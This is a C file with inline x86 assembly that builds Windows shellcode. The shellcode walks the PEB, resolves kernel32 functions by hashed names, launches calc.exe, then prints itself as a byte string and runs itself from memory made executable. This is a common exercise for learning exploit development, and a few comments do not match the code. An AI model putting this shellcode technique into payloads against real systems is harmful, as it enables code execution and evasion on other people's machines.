#include <stdio.h>
#include <malloc.h>
#include <string.h>
#include <windows.h>
#include <stdlib.h>


/* 
	Note also 32 bit environment
*/


int make_executable(unsigned int addr){
	//Note we should call this function not from stack section, but .text section. like normal call
	// local variables 
	unsigned int *good;
	int ret;
	int addr_clean = 0xffffe000 & addr;
	LPVOID lpAddress = (LPVOID) addr_clean;
	DWORD dwSize = 0x2000; 
	DWORD flNewProtect = 0x40; 
	PDWORD lpfOldProtect = (PDWORD)&good; 
	
	ret = VirtualProtect(lpAddress, dwSize,PAGE_EXECUTE_READWRITE, lpfOldProtect); 
	
	// if we failed ... 
	if(ret == 0x0){
		fprintf(stderr,"VirtualAlloc failed on %x with %ld\n", addr_clean, GetLastError());
		return 1;
	}
	// we succeeded 
	fprintf(stdout,"Now %x is executable\n", addr_clean);
	return 0;
}

void getprocaddr()
{
	/*Note: ebx will be our base address, all code is PIC*/
	
	/* utils */
	asm("\n\
	 .set SW_HIDE, 0x0\n\
	");
	
	// ##0## Init:
	asm("\n\
	 .set KERNEL32HASH, 0x000d4e88\n\
	 .set NUMBEROFKERNEL32FUNCTIONS, 0X5\n\
	 .set VIRTUALPROTECTHASH, 0x38d13c\n\
	 .set GETPROCADDRESSHASH, 0x00348bfa\n\
	 .set LOADLIBRARYAHASH, 0x000d5786\n\
	 .set GETSYSTEMDIRECTORYAHASH, 0x069bb2e6\n\
	 .set WINEXECHASH, 0x00006fea\n\
	");
	
	//##1## Entry point
	asm("\n\
	 mainentrypoint:\n\
	 call geteip\n\
	 geteip:\n\
	 pop %ebx\n\
	 movl %ebx, %esp\n\
	 subl $0x1000, %esp\n\
	 and $0xffffff00, %esp\n\
	");
	 
	//##2## GET KERNEL32 FUNCTIONS
	asm("\n\
	 movl $NUMBEROFKERNEL32FUNCTIONS, %ecx \n\
	 lea KERNEL32HASHESTABLE-geteip(%ebx), %esi\n\
	 lea KERNEL32FUNCTIONSTABLE-geteip(%ebx), %edi\n\
	 getkernel32functions:\n\
	 //push the hash we are looking for, which is pointed to by %esi\n\
	 pushl $0\n\
	 pushl (%esi)\n\
	 pushl $KERNEL32HASH\n\
	 call getfuncaddress\n\
	 movl %eax, (%edi)\n\
	 addl $4, %edi\n\
	 addl $4, %esi\n\
	 loop getkernel32functions\n\
	");
	
	// ##3## Spawn calc and breakpoint
	asm("\n\
	 movl $SW_HIDE, %edi\n\
	 push %edi\n\
	 lea PTRCALC-geteip(%ebx), %edi\n\
	 push %edi\n\
	 call *WINEXEC-geteip(%ebx)\n\
	");
	
	//breakpoint debug
	asm("\n\
	BREAKHERE:\n\
	 .long 0xcccccccc\n\
	");
	 
	 
	/* GETFUNCADDRESS ROUTINE */
	/* on 32 bit only for now..
    * fs[0x30] is pointer to PEB
		*that + 0c is _PEB_LDR_DATA pointer
		*that + 0c is in load order module list pointer
		Generally, you will follow these steps:
			1. Get the PE header from the current module (fs:0x30).
			2. Go to the PE header.
			3. Go to the export table and obtain the value of nBase.
			4. Get arrayOfNames and find the function.
	 
    * on 64 bit
		gs[0x60]  is pointer to PEB
			*that + 0x18 is _PEB_LDR_DATA pointer
      *that + 0x10 is in load order module list pointer
     Generally you will follow these steps:
			1. Get the PE header from the current module (gs:0x60
			2. Go to the PE header
			3. Go to the export table and obtain the value of nBase.
			4. Get arrayOfNames and find the function.
	*/
	asm("//arg[0]=what dll hashed, arg[1]=what function of that dll,also hashed\n\
	 getfuncaddress:\n\
	 pushl %ebp\n\
	 movl %esp, %ebp\n\
	 pushl %ebx\n\
	 pushl %esi\n\
	 pushl %edi\n\
	 pushl %ecx\n\
	 pushl %fs:(0x30)\n\
	 popl %eax\n\
	 NT:\n\
	 movl 0xc(%eax), %eax\n\
	 movl 0xc(%eax), %ecx\n\
	 nextinlist:\n\
	 movl (%ecx), %edx\n\
	 movl 0x30(%ecx), %eax\n\
	 //push unicode increment value\n\
	 //here we are unicode for that we use this..\n\
	 pushl $2\n\
	 //push dll name hash address\n\
	 movl 8(%ebp), %edi\n\
	 pushl %edi\n\
	 //push string address to compare\n\
	 pushl %eax\n\
	 call hashit\n\
	 test %eax, %eax\n\
	 jz foundmodule\n\
	 //otherwise check the next node in the list\n\
	 movl %edx, %ecx\n\
	 jmp nextinlist\n\
	 //Found the module, NOW get the procedure\n\
	 foundmodule:\n\
	 //first get the base address, and remember the structure is ldr_module_data\n\
	 movl 0x18(%ecx), %eax\n\
	 push %eax\n\
	 //get e_lfanew offset, and find is real address, that will contain the nt headers structure\n\
	 movl 0x3c(%eax), %ebx\n\
	 addl %ebx, %eax\n\
	 //PE->export table is what we want, starting at offset 0xf8\n\
	 movl 0x78(%eax), %ebx\n\
	 pop %eax\n\
	 push %eax\n\
	 addl %eax, %ebx\n\
	 \n\
		//this eax is now the Export Directory Table\n\
		//From MS PE-COFF table, 6.3.1 (search for pecoff at MS Site to download)\n\
		//Offset Size Field Description\n\
		// .... some data \n\
		//16 4 Ordinal Base (usually set to one!)\n\
		// ....  some other data\n\
		//24 4 Number of Name pointers (also the number of ordinals)\n\
		//28 4 Export Address Table RVA Address EAT relative to base\n\
		//32 4 Name Pointer Table RVA Addresses (RVA’s) of Names!\n\
		//36 4 Ordinal Table RVA You need the ordinals to get the addresses\n\
	 \n\
	 movl 16(%ebx),%edi\n\
	 //edi is now the ordinal base (if args[2]==1 then we must use it later..)\n\
	 movl 28(%ebx), %ecx\n\
	 //ecx is now the address table..\n\
	 movl 32(%ebx), %edx\n\
	 //edx is the name pointer table \n\
	 movl 36(%ebx), %ebx\n\
	 //ebx is the ordinal table\n\
	 //use eax and get the real virtual addres\n\
	 addl %eax, %ecx\n\
	 addl %eax, %edx\n\
	 addl %eax, %ebx\n\
	 \n\
	 //Now we find the function pointer finaly.\n\
	 find_procedure:\n\
	 movl (%edx), %esi\n\
	 pop %eax\n\
	 push %eax\n\
	 addl %eax, %esi\n\
	 //push the hash increment - we are ascii here...\n\
	 pushl $1\n\
	 pushl 12(%ebp)\n\
	 pushl %esi\n\
	 call hashit\n\
	 test %eax, %eax\n\
	 jz found_procedure\n\
	 add $4, %edx\n\
	 add $2, %ebx\n\
	 jmp find_procedure\n\
	 \n\
	 found_procedure:\n\
	 pop %eax\n\
	 xor %edx, %edx\n\
	 mov (%ebx), %dx\n\
	 push %edi\n\
	 movl 16(%ebp), %edi\n\
	 test %edi, %edi\n\
	 pop %edi\n\
	 jz no_ordinalbase\n\
	 //SymbolRVA = ExportAddressTable[ordinal-OrdinalBase]\n\
	 //substract ordinal base in this case\n\
	 sub %edi,%edx\n\
	 no_ordinalbase:\n\
	 //multiply by sizeof(dword) 4\n\
	 shl $2, %edx \n\
	 //now add the result to the export address table\n\
	 add %edx, %ecx\n\
	 //and in the end the base address\n\
	 add (%ecx), %eax\n\
	 popl %ecx\n\
	 popl %edi\n\
	 popl %esi\n\
	 popl %ebx\n\
	 mov %ebp, %esp\n\
	 pop %ebp\n\
	 ret $12\n\
	");
	 
	/*hashit function args[0]=string to be hashed, args[1]=already hashed string, args[2]=ascii or unicode */
	asm("\n\
		hashit:\n\
		pushl %ebp\n\
		movl %esp, %ebp\n\
		push %ecx\n\
		push %ebx\n\
		push %edx\n\
		xor %ecx, %ecx\n\
		xor %ebx, %ebx\n\
		xor %edx, %edx\n\
		mov 8(%ebp), %eax\n\
		hashloop:\n\
		movb (%eax), %dl\n\
		//convert char to upper case..\n\
		or $0x60, %dl\n\
		add %edx, %ebx\n\
		shl $1, %ebx\n\
		addl 16(%ebp), %eax\n\
		mov (%eax), %cl\n\
		test %cl, %cl\n\
		loopnz hashloop\n\
		xor %eax, %eax\n\
		mov 12(%ebp), %ecx\n\
		cmp %ecx, %ebx\n\
		jz donehash\n\
		inc %eax\n\
		donehash:\n\
		pop %edx\n\
		pop %ebx\n\
		pop %ecx\n\
		mov %ebp, %esp\n\
		pop %ebp\n\
		ret $12\n\
	");

	 
	/*Here it begins our data.*/
	asm("\n\
	KERNEL32HASHESTABLE:\n\
	 .long GETSYSTEMDIRECTORYAHASH\n\
	 .long VIRTUALPROTECTHASH\n\
	 .long GETPROCADDRESSHASH\n\
	 .long LOADLIBRARYAHASH\n\
	 .long WINEXECHASH\n\
	 \n\
	PTRCALC:\n\
	 .ascii \"calc.exe\"\n\
	 .long 0x00000000\n\
	 \n\
	tail:\n\
	KERNEL32FUNCTIONSTABLE:\n\
	 GETSYSTEMDIRECTORYA:\n\
		.long 0x00000000\n\
	 VIRTUALPROTECT:\n\
		.long 0x00000000\n\
	 GETPROCADDRA:\n\
		.long 0x00000000\n\
	 LOADLIBRARY:\n\
		.long 0x00000000\n\
	 WINEXEC:\n\
		.long 0x00000000\n\
	 \n\
	 BUF:\n\
		.long 0x00000000\n\
		.long 0x00000000\n\
	 ");
}


int main()
{

	unsigned char buffer[4000];
	unsigned char * p;
	unsigned char * p2;
	int i;
	int noError=0;
	
	//getprocaddr();
	memcpy(buffer,(const void *)getprocaddr,2400);
	p = buffer+3;
	p2 = p;
	
	#define DOPRINT
	#ifdef DOPRINT
		//gdb ) printf “%d\n”, endsploit - mainentrypoint -1
		printf("shellcode=\"");
		for (i=0; i<666; i++)
		{
		printf("\\x%2.2x",*p);
		if ((i+1)%8==0)
		printf("\"\nshellcode+=\"");
		p++;
		}
		printf("\"\n");
	#endif
	
	#define MMEX
	#ifdef MMEX
		if( make_executable((unsigned int) p) == 0)
			noError = 1;
	#endif
	
	
	if(noError)
		((void(*)())(p2)) ();
	
	return 0;
}

